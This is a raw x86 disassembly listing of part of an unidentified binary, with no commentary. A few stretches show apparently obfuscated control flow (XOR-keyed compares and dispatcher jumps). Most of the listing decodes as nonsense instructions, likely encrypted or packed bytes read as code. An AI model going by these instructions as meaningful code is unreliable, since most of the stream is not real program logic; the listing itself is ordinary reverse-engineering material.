  40c5f3:	mov    edi,DWORD PTR [ebp-0x8]
  40c5f6:	xor    edi,ecx
  40c5f8:	lea    edx,[edx+edi*1+0x327298]
  40c5ff:	add    DWORD PTR [eax],edx
  40c601:	jmp    0x40c91a
  40c606:	cmp    eax,0xd9d2c1d7
  40c60b:	fcmove st,st(5)
  40c60d:	(bad)  ds:0x46d2d2f7
  40c613:	ror    DWORD PTR [esi+0x52],1
  40c616:	ss cwde 
  40c618:	js     0x40c692
  40c61a:	je     0x40c69a
  40c61c:	js     0x40c696
  40c61e:	(bad)  
  40c61f:	push   ebp
  40c620:	sub    al,0x78
  40c622:	or     DWORD PTR [ebx+0x6b2cc885],edx
  40c628:	ror    BYTE PTR [ecx+ecx*8+0x278aba5b],0xa7
  40c630:	mov    dh,0xd9
  40c632:	mov    edx,0xe269ce6f
  40c637:	stc    
  40c638:	jns    0x40c606
  40c63a:	ja     0x40c5fd
  40c63c:	ficom  WORD PTR [eax-0x5854fdc6]
  40c642:	inc    edi
  40c643:	ins    BYTE PTR es:[edi],dx
  40c644:	mov    al,ds:0x5e4f5432
  40c649:	push   ds
  40c64a:	xor    eax,0x772d5a4b
  40c64f:	(bad)  
  40c650:	fldcw  WORD PTR [esi]
  40c652:	xor    bl,BYTE PTR [ebp+0x3b]
  40c655:	sbb    BYTE PTR [edi+0x64c46813],ch
  40c65b:	push   ebx
  40c65c:	and    ecx,DWORD PTR es:[ebx]
  40c65f:	xor    bh,al
  40c661:	pop    es
  40c662:	lods   al,BYTE PTR ds:[esi]
  40c663:	retf   
  40c664:	fdivr  st(0),st
  40c666:	outs   dx,DWORD PTR ds:[esi]
  40c667:	mov    dl,0xf9
  40c669:	mov    BYTE PTR [edi+ebp*8+0xa],al
  40c66d:	jge    0x40c604
  40c66f:	dec    esp
  40c670:	repnz hlt 
  40c672:	dec    eax
  40c673:	mov    BYTE PTR [ecx],dl
  40c675:	inc    ebx
  40c676:	int    0x77
  40c678:	repz adc BYTE PTR [edx-0x10],dh
  40c67c:	mov    esp,0x5b6e3acd
  40c681:	int    0x3
  40c683:	pusha  
  40c684:	push   cs
  40c685:	lods   eax,DWORD PTR ds:[esi]
  40c686:	fidivr DWORD PTR [esi]
  40c688:	push   edx
  40c689:	xor    al,0xf1
  40c68b:	push   edx
  40c68c:	fist   DWORD PTR ds:0x2065f650
  40c692:	fs inc esi
  40c694:	inc    edi
  40c695:	adc    ah,0xb7
  40c698:	rol    DWORD PTR [edi-0x6],1
  40c69b:	adc    al,0x20
  40c69d:	jl     0x40c6ae
  40c69f:	fimul  WORD PTR [edi-0x22]
  40c6a2:	mov    edi,0xb7f70646
  40c6a7:	inc    esp
  40c6a8:	xor    DWORD PTR [edx-0x50],ebp
  40c6ab:	push   edi
  40c6ac:	push   es
  40c6ad:	stos   BYTE PTR es:[edi],al
  40c6ae:	cmp    eax,DWORD PTR [ecx+0x1b]
  40c6b1:	das    
  40c6b2:	push   ss
  40c6b3:	or     eax,0x351c27e9
  40c6b8:	jecxz  0x40c67f
  40c6ba:	mov    dh,0x34
  40c6bc:	es imul eax,esp,0xffffffc6
  40c6c0:	jmp    0x81dc:0x8215d86c
  40c6c7:	out    dx,al
  40c6c8:	fidiv  WORD PTR [eax]
  40c6ca:	jecxz  0x40c677
  40c6cc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c6cd:	xor    DWORD PTR [ecx+0x7f8451c8],edx
  40c6d3:	or     BYTE PTR [esi+0x40a67af1],dl
  40c6d9:	jns    0x40c6a2
  40c6db:	adc    dh,BYTE PTR [ebp+0x7896200e]
  40c6e1:	pop    edi
  40c6e2:	jns    0x40c666
  40c6e4:	out    0xf,al
  40c6e6:	mov    eax,0xc88551e4
  40c6eb:	gs push edx
  40c6ed:	aaa    
  40c6ee:	pop    ds
  40c6ef:	das    
  40c6f0:	or     ecx,eax
  40c6f2:	xor    ecx,esi
  40c6f4:	xchg   esp,eax
  40c6f5:	dec    esp
  40c6f6:	pop    ds
  40c6f7:	mov    cl,0xfc
  40c6f9:	cwde   
  40c6fa:	jbe    0x40c737
  40c6fc:	sbb    eax,0xaa3dee4a
  40c701:	shl    DWORD PTR [edx-0x61],0x88
  40c705:	inc    ebx
  40c706:	sbb    DWORD PTR [esi-0x33aa26d3],esi
  40c70c:	xor    eax,0x35279e3a
  40c711:	sahf   
  40c712:	pop    edi
  40c713:	adc    eax,0x2e7283a6
  40c718:	ffreep st(4)
  40c71a:	dec    eax
  40c71b:	mov    esp,0x90cbd828
  40c720:	cld    
  40c721:	test   eax,0xf5a2ed7
  40c726:	mov    ds:0xe610dfec,al
  40c72b:	repz retf 
  40c72d:	cmp    ebx,ecx
  40c72f:	push   cs
  40c730:	mov    esi,0x17e5357e
  40c735:	shl    BYTE PTR ds:0x23302e56,cl
  40c73b:	pop    ss
  40c73c:	out    dx,al
  40c73d:	cmp    eax,0x63cce621
  40c742:	cmp    al,0xaf
  40c744:	adc    eax,0x9791781d
  40c749:	nop
  40c74a:	jae    0x40c7a2
  40c74c:	sub    BYTE PTR [esp+edx*4+0x33],ch
  40c750:	mov    ebp,0x8b303317
  40c755:	xchg   edx,eax
  40c756:	inc    esi
  40c757:	retf   0xb325
  40c75a:	fild   DWORD PTR [ebp-0x2c0ec92d]
  40c760:	das    
  40c761:	(bad)  
  40c762:	scas   al,BYTE PTR es:[di]
  40c764:	jmp    0x40c720
  40c766:	test   al,0x12
  40c768:	push   edx
  40c769:	shr    DWORD PTR [eax-0x6c0b2419],0x79
  40c770:	stos   DWORD PTR es:[edi],eax
  40c771:	mov    al,0x56
  40c774:	js     0x40c757
  40c776:	push   edx
  40c777:	fs dec esi
  40c779:	cmp    eax,0x52d4b36d
  40c77e:	mov    gs,WORD PTR [edx+0x22]
  40c781:	jge    0x40c7fe
  40c783:	and    BYTE PTR [edi],0x55
  40c786:	stc    
  40c787:	scas   eax,DWORD PTR es:[edi]
  40c788:	or     esi,DWORD PTR [edi-0x10]
  40c78b:	inc    ecx
  40c78c:	adc    eax,0xa06f4b99
  40c791:	mov    ah,0xc1
  40c793:	pop    esp
  40c794:	ins    DWORD PTR es:[edi],dx
  40c795:	jle    0x40c7b8
  40c797:	sahf   
  40c798:	mov    ebp,0xef98409e
  40c79d:	out    dx,al
  40c79e:	dec    edx
  40c79f:	ror    BYTE PTR [ecx-0x13],1
  40c7a2:	(bad)  
  40c7a3:	mov    edx,0x6748863a
  40c7a8:	adc    eax,0x3f8dc795
  40c7ad:	scas   eax,DWORD PTR es:[edi]
  40c7ae:	jp     0x40c7dd
  40c7b0:	in     al,dx
  40c7b1:	jmp    0x40c820
  40c7b3:	jecxz  0x40c756
  40c7b5:	adc    eax,0xd2491645
  40c7ba:	push   0xfb1b4d6c
  40c7bf:	mov    bh,BYTE PTR cs:[ebp-0x6195aaa0]
  40c7c6:	mov    WORD PTR [esp+ebx*8],ds
  40c7c9:	pop    es
  40c7ca:	dec    esp
  40c7cb:	clc    
  40c7cc:	push   edx
  40c7cd:	mov    edx,0x6c0f5584
  40c7d2:	mov    cl,0x71
  40c7d4:	int    0xf1
  40c7d6:	in     al,0x9a
  40c7d8:	mov    al,0x2c
  40c7da:	dec    esi
  40c7db:	inc    edi
  40c7dc:	dec    DWORD PTR [ebx]
  40c7de:	inc    eax
  40c7df:	xchg   ecx,eax
  40c7e0:	pop    edi
  40c7e1:	pop    esp
  40c7e2:	and    edi,esp
  40c7e4:	sub    esp,ecx
  40c7e6:	xchg   ebx,eax
  40c7e7:	xor    ebx,edx
  40c7e9:	ins    BYTE PTR es:[edi],dx
  40c7ea:	mov    ecx,0x710815b7
  40c7ef:	push   ebx
  40c7f0:	stos   BYTE PTR es:[edi],al
  40c7f1:	mov    ch,ah
  40c7f3:	pop    es
  40c7f4:	jmp    0xbdf7f552
  40c7f9:	in     eax,0x41
  40c7fb:	ror    DWORD PTR [ecx],1
  40c7fd:	push   ebx
  40c7fe:	xor    al,0x9d
  40c800:	loop   0x40c7d6
  40c802:	aad    0x5a
  40c804:	int    0x3d
  40c806:	jge    0x40c846
  40c808:	dec    ebp
  40c809:	and    al,0x22
  40c80b:	fs push ss
  40c80d:	xchg   ah,cl
  40c80f:	dec    esp
  40c810:	in     al,dx
  40c811:	mov    al,0xc9
  40c813:	xor    edi,DWORD PTR [ecx-0x3]
  40c816:	dec    ebx
  40c817:	dec    edx
  40c818:	xchg   ebp,eax
  40c819:	shr    DWORD PTR [esi],1
  40c81b:	ss pop es
  40c81d:	out    dx,al
  40c81e:	(bad)  
  40c81f:	ficomp DWORD PTR ds:0x72ba0d5d
  40c825:	(bad)  [ecx+0x2d]
  40c828:	pop    ecx
  40c829:	inc    esi
  40c82a:	jne    0x40c7cc
  40c82c:	cdq    
  40c82d:	clc    
  40c82e:	jmp    0x5449:0x4f7e5efe
  40c835:	pop    ebx
  40c836:	push   ecx
  40c837:	mov    ebp,0x3842e6ff
  40c83c:	pop    edx
  40c83d:	push   edi
  40c83e:	retf   
  40c83f:	dec    edi
  40c840:	xlat   BYTE PTR ds:[ebx]
  40c841:	vandps xmm4,xmm6,XMMWORD PTR [ecx+edi*8+0x7d]
  40c847:	jne    0x40c86d
  40c849:	mov    esp,0x45bdd231
  40c84e:	jle    0x40c8c5
  40c850:	mov    bh,0x13
  40c852:	imul   ebp,DWORD PTR [ecx+0x7a],0x32f217f
  40c859:	bound  edx,QWORD PTR [ecx-0x3bc91f7b]
  40c85f:	shl    DWORD PTR [eax+0x35],0xbc
  40c863:	sub    edi,0xffffffc8
  40c866:	push   esp
  40c867:	or     esi,DWORD PTR [eax*4-0x35bfbced]
  40c86e:	sub    eax,DWORD PTR [ebp+0x1362acb5]
  40c874:	dec    edx
  40c875:	mov    bh,0x2b
  40c877:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c878:	cli    
  40c879:	cmp    bh,BYTE PTR ds:0x223eb54e
  40c87f:	dec    esi
  40c880:	adc    dh,dh
  40c882:	mov    fs,ecx
  40c884:	fisttp DWORD PTR [edx]
  40c886:	mov    edx,0x240a917
  40c88b:	mov    ch,0x5a
  40c88d:	pusha  
  40c88e:	out    0x88,al
  40c890:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  40c892:	add    eax,0x9d8e22f5
  40c897:	sbb    al,0x7a
  40c899:	cli    
  40c89a:	adc    eax,0x6c8734dc
  40c89f:	xchg   ebp,eax
  40c8a0:	in     al,0x9e
  40c8a2:	or     al,0xab
  40c8a4:	call   0x2059907b
  40c8a9:	les    ecx,FWORD PTR [ebp-0x2c4373a]
  40c8af:	xor    eax,0x47dc52a5
  40c8b4:	jecxz  0x40c862
  40c8b6:	ret    
  40c8b7:	bnd jno 0x40c859
  40c8ba:	and    al,0x3c
  40c8bc:	outs   dx,BYTE PTR ds:[esi]
  40c8bd:	(bad)  
  40c8be:	cdq    
  40c8bf:	and    edx,0x86fd31c2
  40c8c5:	iret   
  40c8c6:	xlat   BYTE PTR ds:[ebx]
  40c8c7:	mov    esi,0xe9378ae9
  40c8cc:	test   BYTE PTR [edi+0x78],bl
  40c8cf:	push   0xffb257ee
  40c8d4:	add    al,0xba
  40c8d6:	sbb    eax,0xbe9fa18
  40c8db:	pop    ebp
  40c8dc:	aas    
  40c8dd:	push   edi
  40c8de:	jecxz  0x40c941
  40c8e0:	rol    DWORD PTR [ebp+0x19],cl
  40c8e3:	sub    eax,DWORD PTR [edi+0x4f]
  40c8e6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c8e7:	dec    ebp
  40c8e8:	push   es
  40c8e9:	fisub  DWORD PTR [esi+ecx*4+0x8ec5e48]
  40c8f0:	iret   
  40c8f1:	in     al,0x7c
  40c8f3:	lea    ebx,[edx]
  40c8f5:	aaa    
  40c8f6:	sbb    DWORD PTR [ebx],esi
  40c8f8:	into   
  40c8f9:	mov    bh,0x52
  40c8fb:	inc    eax
  40c8fc:	add    BYTE PTR [esi+0x7],0x9
  40c900:	mov    ah,0x79
  40c902:	xor    ecx,DWORD PTR [eax+0x5bcd7f3f]
  40c908:	and    al,0xe9
  40c90a:	add    al,cl
  40c90c:	and    BYTE PTR ds:0xcea9a5da,cl
  40c912:	sti    
  40c913:	sbb    dl,dl
  40c915:	sub    eax,0x18e5d6b5
  40c91a:	mov    eax,DWORD PTR [ebp-0x20]
  40c91d:	mov    edx,DWORD PTR [ebp-0x8]
  40c920:	mov    edi,DWORD PTR [ebp-0x24]
  40c923:	xor    edx,ecx
  40c925:	add    edx,esi
  40c927:	imul   edx,edi
  40c92a:	sub    DWORD PTR [eax],edx
  40c92c:	mov    eax,DWORD PTR [ebp-0x14]
  40c92f:	jmp    0x40b5ea
  40c934:	mov    eax,DWORD PTR [ebp-0xc]
  40c937:	mov    edx,DWORD PTR [ebp-0x18]
  40c93a:	xor    eax,edx
  40c93c:	cmp    eax,0x7a0d5426
  40c941:	je     0x40b5e7
  40c947:	mov    eax,DWORD PTR [ebp-0x10]
  40c94a:	add    DWORD PTR [eax],0x7403502
  40c950:	jmp    0x40b5e7
  40c955:	mov    eax,DWORD PTR [ebp-0x1c]
  40c958:	jmp    0x40cc71
  40c95d:	rol    ebx,cl
  40c95f:	(bad)
  40c962:	leave  
  40c963:	rcr    ebx,1
  40c965:	mov    al,ds:0x924c5e53
  40c96a:	nop
  40c96b:	jl     0x40c9cb
  40c96d:	xor    bl,BYTE PTR [ebp+0x7e747878]
  40c973:	js     0x40c9ed
  40c975:	jl     0x40c8f8
  40c977:	dec    ecx
  40c978:	push   esi
  40c979:	and    DWORD PTR ds:0xbe22b6ab,0x2c94a9ee
  40c983:	ins    BYTE PTR es:[edi],dx
  40c984:	in     al,dx
  40c985:	repz add esp,edx
  40c988:	push   ebx
  40c989:	frstor [eax]
  40c98b:	mov    eax,ds:0x1ee3a4db
  40c990:	push   cs
  40c991:	and    eax,0xf3001831
  40c996:	mov    ecx,0x2a5a0a82
  40c99b:	test   al,0x9f
  40c99e:	popf   
  40c99f:	fwait
  40c9a0:	xor    eax,0x115f9241
  40c9a5:	xchg   ecx,eax
  40c9a6:	enter  0x40f7,0xf6
  40c9aa:	dec    ebx
  40c9ab:	inc    edx
  40c9ac:	jae    0x40c9df
  40c9ae:	retf   0x213
  40c9b1:	mov    ch,0x28
  40c9b3:	les    edx,FWORD PTR [ebp+0x6f3cae4b]
  40c9b9:	imul   ebx,edx,0x80807e9e
  40c9bf:	icebp  
  40c9c0:	fiadd  DWORD PTR [edx-0x45ec0f68]
  40c9c6:	mov    ch,0x73
  40c9c8:	cmp    al,0xc0
  40c9ca:	push   ebp
  40c9cb:	sub    al,bh
  40c9cd:	cwde   
  40c9ce:	mov    ds:0x4fc33b1,eax
  40c9d3:	mov    BYTE PTR [edi+0x3d336f69],al
  40c9d9:	pop    esp
  40c9da:	aaa    
  40c9db:	es pop ebp
  40c9dd:	shl    BYTE PTR [edx+0x63],cl
  40c9e0:	sub    eax,0x77ceca96
  40c9e5:	sbb    ebx,DWORD PTR [edi+0x7]
  40c9e8:	jae    0x40c9d0
  40c9ea:	inc    ebx
  40c9eb:	mov    eax,ds:0x8689810b
  40c9f0:	push   cs
  40c9f1:	xchg   ebp,eax
  40c9f2:	push   ebp
  40c9f3:	cld    
  40c9f4:	add    esi,DWORD PTR [ecx+0x68c3c32a]
  40c9fa:	add    ah,BYTE PTR [edi]
  40c9fc:	(bad)  
  40c9fd:	cmp    ch,cl
  40c9ff:	cmp    al,0xfe
  40ca01:	imul   esp,DWORD PTR [ebx],0xffffffd0
  40ca04:	stos   DWORD PTR es:[edi],eax
  40ca05:	nop
  40ca06:	cli    
  40ca07:	fwait
  40ca08:	mov    ds:0xa17c8396,eax
  40ca0d:	repz add al,0xe1
  40ca10:	jb     0x40ca90
  40ca12:	mov    ds:0x4ba5f3d1,al
  40ca17:	retf   
  40ca18:	scas   eax,DWORD PTR es:[edi]
  40ca19:	loope  0x40ca85
  40ca1b:	scas   eax,DWORD PTR es:[edi]
  40ca1c:	repnz aad 0xb8
  40ca1f:	sahf   
  40ca20:	ins    BYTE PTR es:[edi],dx
  40ca21:	sub    BYTE PTR [esi-0x7d],0x38
  40ca25:	sub    al,0xf
  40ca27:	cs pop esi
  40ca29:	xor    esp,DWORD PTR [ebx-0x53]
  40ca2c:	or     eax,DWORD PTR [eax]
  40ca2e:	add    al,0x8f
  40ca30:	mov    ebx,0x927de3e9
  40ca35:	stos   DWORD PTR es:[edi],eax
  40ca36:	mov    ebx,0x7867a83d
  40ca3b:	push   0x3f690abf
  40ca40:	in     al,0x35
  40ca42:	xchg   ecx,eax
  40ca43:	call   0xce884373
  40ca48:	call   0xfbd8466a
  40ca4d:	xchg   DWORD PTR [esi],ebp
  40ca4f:	test   BYTE PTR [ebx],al
  40ca51:	das    
  40ca52:	and    dl,BYTE PTR [esi-0x1d]
  40ca55:	in     eax,dx
  40ca56:	aaa    
  40ca57:	in     eax,dx
  40ca58:	daa    
  40ca59:	lea    ecx,[eax]
  40ca5b:	cli    
  40ca5c:	test   al,0xc0
  40ca5e:	jnp    0x40ca8a
  40ca60:	xor    esp,esi
  40ca62:	ficom  WORD PTR [ecx+0x37]
  40ca65:	div    BYTE PTR [ecx-0x79]
  40ca68:	push   esp
  40ca69:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ca6a:	fistp  QWORD PTR [edi]
  40ca6c:	mov    edx,0x3deb5297
  40ca71:	xsha256 (bad)
  40ca72:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ca73:	xchg   esp,eax
  40ca74:	jmp    0xbdb20291
  40ca79:	clc    
  40ca7a:	pop    eax
  40ca7c:	pop    ebp
  40ca7d:	xlat   BYTE PTR ds:[ebx]
  40ca7e:	xor    bh,BYTE PTR [edi+eiz*1]
  40ca81:	xor    ebp,DWORD PTR [edi-0x65]
  40ca84:	mov    esp,?
  40ca86:	lods   eax,DWORD PTR ds:[esi]
  40ca87:	enter  0x88e6,0xfc
  40ca8b:	push   0x1f25453a
  40ca90:	loope  0x40ca3f
  40ca92:	push   esi
  40ca93:	mov    bh,ch
  40ca95:	pop    ebp
  40ca96:	sub    al,dh
  40ca98:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ca99:	jg     0x40ca5b
  40ca9b:	fimul  WORD PTR [ecx+0x47]
  40ca9e:	sar    DWORD PTR [esi+0x1e],0x21
  40caa2:	aad    0x81
  40caa4:	sbb    BYTE PTR [eax+0xa],cl
  40caa7:	ret    
  40caa8:	mov    dl,0xc8
  40caaa:	cmp    ebp,DWORD PTR [edx-0x2c]
  40caad:	cmp    DWORD PTR [edi],esi
  40caaf:	sub    BYTE PTR ds:0xcfcb0a0f,al
  40cab5:	mov    ebp,0x9843806d
  40caba:	jns    0x40cab1
  40cabc:	push   es
  40cabd:	aam    0x8b
  40cabf:	mov    ecx,0x2d20d1a4
  40cac4:	mov    ecx,0x9e67a72d
  40cac9:	jno    0x40cb36
  40cacb:	xlat   BYTE PTR ds:[ebx]
  40cacc:	jae    0x40cadf
  40cace:	cli    
  40cacf:	xchg   ebp,eax
  40cad0:	cwde   
  40cad1:	cmp    DWORD PTR [ebp-0x1519132e],eax
  40cad7:	cmp    eax,0xfe7c1bf1
  40cadc:	add    dl,BYTE PTR [eax+0x3e462cf9]
  40cae2:	test   al,0x8f
  40cae4:	fcomp  DWORD PTR [ebx]
  40cae6:	xlat   BYTE PTR ds:[ebx]
  40cae7:	outs   dx,DWORD PTR ds:[esi]
  40cae8:	mov    dh,0xf6
  40caea:	retf   0xd56d
  40caed:	rcr    WORD PTR [ecx],1
  40caf0:	outs   dx,BYTE PTR ds:[esi]
  40caf1:	xchg   ecx,eax
  40caf2:	mov    edi,0x7d75bdee
  40caf7:	push   cs
  40caf8:	inc    esi
  40caf9:	stc    
  40cafa:	pushf  
  40cafb:	jmp    0xa4b9eb64
  40cb00:	mov    bh,0xa2
  40cb02:	mov    al,ds:0x7280b132
  40cb07:	pop    edx
  40cb08:	div    BYTE PTR ds:0x5f0a541
  40cb0e:	cli    
  40cb0f:	xchg   ebp,eax
  40cb10:	add    DWORD PTR [edx+eax*8-0xd],ebp
  40cb14:	ret    0x128e
  40cb17:	push   es
  40cb18:	or     ecx,esi
  40cb1a:	and    DWORD PTR [eax-0x3601e1c1],ebp
  40cb20:	lea    ebx,[ebx]
  40cb22:	imul   DWORD PTR [ebp-0x5f1669f1]
  40cb28:	aaa    
  40cb29:	ds fcomp st(1)
  40cb2c:	xor    DWORD PTR [ecx],ebx
  40cb2e:	sub    al,0x90
  40cb30:	inc    esp
  40cb31:	cld    
  40cb32:	ins    DWORD PTR es:[edi],dx
  40cb33:	cmp    esp,DWORD PTR [eax+0x2d]
  40cb36:	sbb    al,0xd3
  40cb38:	push   ebp
  40cb39:	pop    ebx
  40cb3a:	cmp    eax,0x61cfb07d
  40cb3f:	add    eax,0xd6a7a927
  40cb44:	xchg   edx,eax
  40cb45:	fmul   st(6),st
  40cb47:	xchg   esp,eax
  40cb48:	xor    eax,0x1c1f9e4d
  40cb4e:	dec    ebp
  40cb4f:	mov    BYTE PTR ds:0x298fa7da,bh
  40cb55:	xchg   DWORD PTR [edx],esi
  40cb57:	or     BYTE PTR [ebx-0x6c4e1f40],dh
  40cb5d:	test   DWORD PTR [ebx],edx
  40cb5f:	in     al,0xe1
  40cb61:	pop    ecx
  40cb62:	add    edi,edx
  40cb64:	mov    esp,0x629f2d18
  40cb69:	in     eax,0x3a
  40cb6b:	popa   
  40cb6c:	inc    ebp
  40cb6d:	int3   
  40cb6e:	faddp  st(7),st
  40cb70:	xor    ebp,edx
  40cb72:	cmp    BYTE PTR [ecx+0x26ce428a],ch
  40cb78:	pop    esp
  40cb79:	push   0x2b
  40cb7b:	inc    ecx
  40cb7c:	ret    
  40cb7d:	arpl   WORD PTR [edi+0x733e3ac1],cx
  40cb83:	cmp    al,0xbe
  40cb85:	mov    edi,0xed416a19
  40cb8a:	jecxz  0x40cb9f
  40cb8c:	int3   
  40cb8d:	mov    bh,0x13
  40cb8f:	xor    DWORD PTR [ecx+0x7604bf26],ebx
  40cb95:	add    al,ch
  40cb97:	push   ss
  40cb98:	mov    ah,0xb1
  40cb9a:	sbb    al,0xcb
  40cb9c:	out    dx,al
  40cb9d:	mov    dh,0x7f
  40cb9f:	mov    esp,0x3ded0f5c
  40cba4:	sbb    BYTE PTR [ecx],dl
  40cba6:	add    bh,BYTE PTR ds:0xf7f4e814
  40cbac:	push   esp
  40cbad:	popa   
  40cbae:	mov    al,ds:0xd9ed4639
  40cbb3:	repz push esp
  40cbb5:	loop   0x40cbbb
  40cbb7:	stos   BYTE PTR es:[edi],al
  40cbb8:	pop    ecx
  40cbb9:	mov    ebx,0x51a93025
  40cbbe:	cmc    
  40cbbf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cbc0:	mov    ds:0x4edc9554,al
  40cbc5:	sbb    ecx,edx
  40cbc7:	retf   
  40cbc8:	outs   dx,DWORD PTR ds:[esi]
  40cbc9:	sub    BYTE PTR [eax-0x40dd867],ah
  40cbcf:	fisttp QWORD PTR [edi-0x7e76c971]
  40cbd5:	dec    esi
  40cbd6:	in     eax,dx
  40cbd7:	add    BYTE PTR [edx],bh
  40cbd9:	imul   esi,DWORD PTR [ebp-0x1c],0x44
  40cbdd:	in     al,0xa3
  40cbdf:	jno    0x40cbde
  40cbe1:	(bad)  
  40cbe4:	out    0x4a,al
  40cbe6:	ja     0x40cbed
  40cbe8:	xor    BYTE PTR [edx+0x1],ch
  40cbeb:	mov    BYTE PTR [edx],dh
  40cbed:	test   BYTE PTR [edi],dh
  40cbef:	mov    al,ds:0xcb304013
  40cbf4:	test   DWORD PTR [edi],ebp
  40cbf6:	(bad)  
  40cbf7:	in     eax,dx
  40cbf8:	xchg   esp,eax
  40cbf9:	fisttp DWORD PTR [edx]
  40cbfb:	dec    ebx
  40cbfc:	daa    
  40cbfd:	mov    esi,0x6f1e967e
  40cc02:	dec    ecx
  40cc03:	cmp    esp,DWORD PTR [edi+0x64]
  40cc06:	and    al,0xc1
  40cc08:	sbb    al,0x3
  40cc0a:	xchg   edi,eax
  40cc0b:	cmc    
  40cc0c:	test   eax,0x12acaa99
  40cc11:	cmp    DWORD PTR [eax+0x26],ebx
  40cc14:	and    DWORD PTR [ebp-0x5dfc8fca],0x477d939
  40cc1e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cc1f:	mov    bl,0xd8
  40cc21:	adc    DWORD PTR [edx+ebx*8],eax
  40cc24:	adc    al,0x95
  40cc26:	mov    DWORD PTR [edx-0x3a79365],esp
  40cc2c:	aam    0xde
  40cc2e:	popa   
  40cc2f:	pop    ds
  40cc30:	and    ecx,ebp
  40cc32:	rcr    esp,cl
  40cc34:	mov    cx,WORD PTR [edx-0x1a]
  40cc38:	xlat   BYTE PTR ds:[ebx]
  40cc39:	ins    BYTE PTR es:[edi],dx
  40cc3a:	pop    ds
  40cc3b:	push   esp
  40cc3c:	xor    al,bh
  40cc3e:	inc    edx
  40cc3f:	lds    esp,FWORD PTR [esi+0x69cf0cf9]
  40cc45:	in     al,0x9a
  40cc47:	es inc esi
  40cc49:	in     al,dx
  40cc4a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cc4b:	scas   eax,DWORD PTR es:[edi]
  40cc4c:	or     bl,ah
  40cc4e:	(bad)  
  40cc50:	push   ds
  40cc51:	sar    BYTE PTR [edx+0x19],1
  40cc54:	aas    
  40cc55:	int3   
  40cc56:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cc57:	or     ebp,DWORD PTR [edx-0x52d449da]
  40cc5d:	pop    esi
  40cc5e:	and    BYTE PTR [esi],bl
  40cc60:	dec    edx
  40cc61:	sub    DWORD PTR [edx-0x697ffd4d],0x33d6db5
  40cc6b:	aad    0x2b
  40cc6d:	inc    ecx
  40cc6e:	js     0x40cbfd
  40cc70:	repnz cmp DWORD PTR [eax],edi
  40cc73:	jmp    0x40cf8c
  40cc78:	(bad)  
  40cc79:	(bad)  
  40cc7a:	rol    esp,1
  40cc7c:	ror    ebx,1
  40cc7e:	aad    0xda
  40cc80:	xchg   esi,eax
  40cc81:	mov    dl,0x71
  40cc83:	aad    0x50
  40cc85:	rol    DWORD PTR [ebp+0x29],1
  40cc88:	mov    cs:0x7e747878,al
  40cc8e:	js     0x40cd08
  40cc90:	cmp    ebp,DWORD PTR [ebx+0x78]
  40cc93:	dec    esp
  40cc94:	(bad)  
  40cc95:	ins    DWORD PTR es:[edi],dx
  40cc96:	pop    ebx
  40cc97:	in     eax,dx
  40cc98:	mov    dl,0x73
  40cc9a:	(bad)  
  40cc9b:	or     al,0x22
  40cc9d:	inc    ecx
  40cc9e:	fsubr  QWORD PTR [edi-0x1e496bdf]
  40cca4:	mov    dh,0x0
  40cca6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cca7:	mov    edx,0x19ee846b
  40ccac:	out    dx,al
  40ccad:	xlat   BYTE PTR ds:[ebx]
  40ccae:	adc    bl,BYTE PTR [esp+esi*2-0x781998aa]
  40ccb5:	xor    eax,0xfd7df04a
  40ccba:	test   DWORD PTR [ecx-0x57e58d73],0xa7185b12
  40ccc4:	jmp    0x40cd27
  40ccc6:	pop    ss
  40ccc7:	and    ch,BYTE PTR [eax+0x78]
  40ccca:	add    BYTE PTR ds:0x344a0972,cl
  40ccd0:	mov    esi,0x6c6539a5
  40ccd5:	cwde   
  40ccd6:	cdq    
  40ccd7:	pusha  
  40ccd8:	dec    esi
  40ccd9:	cmp    esp,DWORD PTR [edi+0x2dd3e24b]
  40ccdf:	es (bad) 
  40cce2:	lods   al,BYTE PTR ds:[esi]
  40cce3:	arpl   dx,di
  40cce5:	out    dx,al
  40cce6:	cs push edi
  40cce8:	or     al,0xff
  40ccea:	cmp    DWORD PTR [ebx+0x63bd5e83],ecx
  40ccf0:	push   0xf559fbee
  40ccf5:	mov    eax,0xb256aea2
  40ccfa:	push   esi
  40ccfb:	and    BYTE PTR [ebx-0x645cb4b0],0xfb
  40cd02:	add    eax,0x757d52f0
  40cd07:	jns    0x40cce3
  40cd09:	inc    esi
  40cd0a:	inc    edi
  40cd0b:	lods   al,BYTE PTR ds:[esi]
  40cd0c:	cwde   
  40cd0d:	scas   al,BYTE PTR es:[edi]
  40cd0e:	push   esi
  40cd0f:	int3   
  40cd10:	dec    esi
  40cd11:	pop    edi
  40cd12:	xchg   ebx,eax
  40cd13:	iret   
  40cd14:	push   ebp
  40cd15:	cld    
  40cd16:	les    esi,FWORD PTR [eiz*1-0x531c0d97]
  40cd1d:	inc    esp
  40cd1e:	xchg   esi,eax
  40cd1f:	popf   
  40cd20:	call   0x4ed12de7
  40cd25:	(bad)  
  40cd26:	mov    edi,0xd89f0518
  40cd2b:	iret   
  40cd2c:	or     edi,DWORD PTR [edx+0x3]
  40cd2f:	(bad)  
  40cd30:	fisub  DWORD PTR [eax-0x4c93a650]
  40cd36:	push   ss
  40cd37:	pop    esp
  40cd38:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cd39:	mov    esp,0xf64514c7
  40cd3e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cd3f:	pop    edi
  40cd40:	aad    0xa8
  40cd42:	jge    0x40cd60
  40cd44:	cs mov ecx,0xcb769665
  40cd4a:	nop
  40cd4b:	aaa    
  40cd4c:	add    BYTE PTR [ebp+ebx*8-0x138eceae],dh
  40cd53:	jmp    0x3604f087
  40cd58:	pop    ss
  40cd59:	scas   eax,DWORD PTR es:[edi]
  40cd5a:	mov    al,ds:0x181087ce
  40cd5f:	xchg   esp,eax
  40cd60:	push   edx
  40cd61:	inc    eax
